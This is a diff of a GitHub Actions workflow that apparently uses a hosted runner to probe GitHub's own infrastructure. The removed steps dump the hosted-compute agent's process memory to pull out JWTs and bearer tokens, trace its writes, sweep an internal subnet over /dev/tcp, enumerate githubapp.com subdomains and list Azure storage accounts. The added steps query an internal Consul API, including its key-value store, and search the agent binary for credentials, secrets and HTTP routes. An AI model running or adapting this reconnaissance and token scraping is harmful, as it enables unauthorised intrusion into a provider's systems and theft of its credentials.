@@ -1,46 +1,44 @@
-name: Memory Scan
+name: Consul and Binary Deep
 on:
   workflow_dispatch:
 jobs:
   scan:
     runs-on: ubuntu-latest
     steps:
-      - name: scan memory and network
+      - name: Consul and binary analysis
         timeout-minutes: 8
         run: |
           set +e
-          HCA_PID=$(pgrep hosted-compute)
-          echo "HCA PID: $HCA_PID"
+          echo "=== CONSUL SERVICE ==="
+          curl -sk --connect-timeout 5 https://consul.githubapp.com/ 2>&1 | head -20
+          curl -sk --connect-timeout 5 https://consul.githubapp.com/v1/agent/self 2>&1 | head -10
+          curl -sk --connect-timeout 5 https://consul.githubapp.com/v1/catalog/services 2>&1 | head -20
+          curl -sk --connect-timeout 5 https://consul.githubapp.com/v1/catalog/nodes 2>&1 | head -20
+          curl -sk --connect-timeout 5 https://consul.githubapp.com/v1/kv/?recurse 2>&1 | head -20
+          curl -sk --connect-timeout 5 https://consul.githubapp.com/v1/status/leader 2>&1
+          curl -sk --connect-timeout 5 https://consul.githubapp.com/v1/status/peers 2>&1
+          curl -sk --connect-timeout 5 https://consul.githubapp.com/ui/ 2>&1 | head -10
           echo ""
-          echo "=== STRACE HCA ==="
-          timeout 8 strace -f -p $HCA_PID -e trace=write -s 500 2>&1 | grep -v EAGAIN | head -80 &
-          STRACE_PID=$!
-          sleep 10
-          kill $STRACE_PID 2>/dev/null
-          wait $STRACE_PID 2>/dev/null
+          echo "=== CONSUL HTTP (port 8500) ==="
+          curl -sk --connect-timeout 3 http://consul.githubapp.com:8500/v1/catalog/services 2>&1 | head -10
+          curl -sk --connect-timeout 3 http://140.82.113.23:8500/v1/catalog/services 2>&1 | head -10
           echo ""
-          echo "=== GO HEAP JWT SCAN ==="
-          dd if=/proc/$HCA_PID/mem bs=4096 count=2048 skip=$((0xc000000000/4096)) 2>/dev/null | strings -n 30 | grep -E '^eyJ' | head -20
+          echo "=== HCA BINARY DEEP STRINGS ==="
+          strings /opt/hca/hosted-compute-agent | grep -iE 'consul|vault|nomad|etcd|redis|postgres|mysql|mongo|elastic|rabbit|kafka|nats' | sort -u | head -20
           echo ""
-          echo "=== GO HEAP URL SCAN ==="
-          dd if=/proc/$HCA_PID/mem bs=4096 count=2048 skip=$((0xc000000000/4096)) 2>/dev/null | strings -n 20 | grep -iE 'orchestrator|scheduler|auth|token|bearer|attest' | head -30
+          echo "=== HCA BINARY CONFIG STRINGS ==="
+          strings /opt/hca/hosted-compute-agent | grep -iE 'config|setting|env|secret|credential|password|apikey|endpoint|url.*=' | sort -u | head -30
           echo ""
-          echo "=== BINARY GO DEPS ==="
-          go version -m /opt/hca/hosted-compute-agent 2>&1 | head -40
+          echo "=== HCA BINARY ERROR MESSAGES ==="
+          strings /opt/hca/hosted-compute-agent | grep -iE 'error.*auth|error.*token|error.*attest|failed.*auth|failed.*token|invalid.*token|unsupported.*attest' | sort -u | head -20
           echo ""
-          echo "=== BINARY ATTESTATION STRINGS ==="
-          strings /opt/hca/hosted-compute-agent | grep -iE 'attestation|jwt|oidc|msal|aad|managed.identity|imds|entra|goalstate' | sort -u | head -30
+          echo "=== HCA BINARY HTTP ROUTES ==="
+          strings /opt/hca/hosted-compute-agent | grep -E '^/v[0-9]|^/api/|^/vm/|^/health|^/status|^/register|^/heartbeat|^/complete|^/cancel|^/trace|^/logs' | sort -u | head -30
           echo ""
-          echo "=== BINARY MODULE PATHS ==="
-          strings /opt/hca/hosted-compute-agent | grep 'github.com/' | sort -u | head -30
+          echo "=== HCA BINARY FUNCTION NAMES ==="
+          strings /opt/hca/hosted-compute-agent | grep -E 'github.com/github/hosted-compute' | sort -u | head -40
           echo ""
-          echo "=== WIDER SUBNET SCAN ==="
-          for s in $(seq 0 15); do for h in 1 10 100 254; do timeout 0.3 bash -c "echo >/dev/tcp/10.1.$s.$h/443" 2>/dev/null && echo "10.1.$s.$h:443 OPEN"; done; done
-          echo ""
-          echo "=== GITHUBAPP SUBDOMAINS ==="
-          for sub in admin api internal monitoring grafana prometheus vault consul render copilot-proxy actions-cache actions-results runner-provisioner codespace-provisioner; do IP=$(dig +short $sub.githubapp.com 2>/dev/null | tail -1); [ -n "$IP" ] && echo "$sub.githubapp.com -> $IP" && curl -sk --connect-timeout 2 "https://$sub.githubapp.com/" 2>/dev/null | head -2; done
-          echo ""
-          echo "=== AZURE STORAGE ==="
-          for name in githubactions githubrunners ghactions hostedcompute actionsrunner; do curl -sk --connect-timeout 2 "https://$name.blob.core.windows.net/?comp=list" 2>&1 | head -3; done
+          echo "=== OTHER GITHUBAPP SUBDOMAINS ==="
+          for sub in consul vault nomad etcd redis kafka nats rabbitmq elasticsearch kibana grafana prometheus alertmanager jaeger zipkin loki tempo mimir pyroscope parca thanos cortex kiali argocd drone concourse buildkite render copilot actions cache artifacts runner codespace spark compute; do IP=$(dig +short $sub.githubapp.com 2>/dev/null | tail -1); [ -n "$IP" ] && echo "$sub.githubapp.com -> $IP"; done
           echo ""
           echo "=== DONE ==="
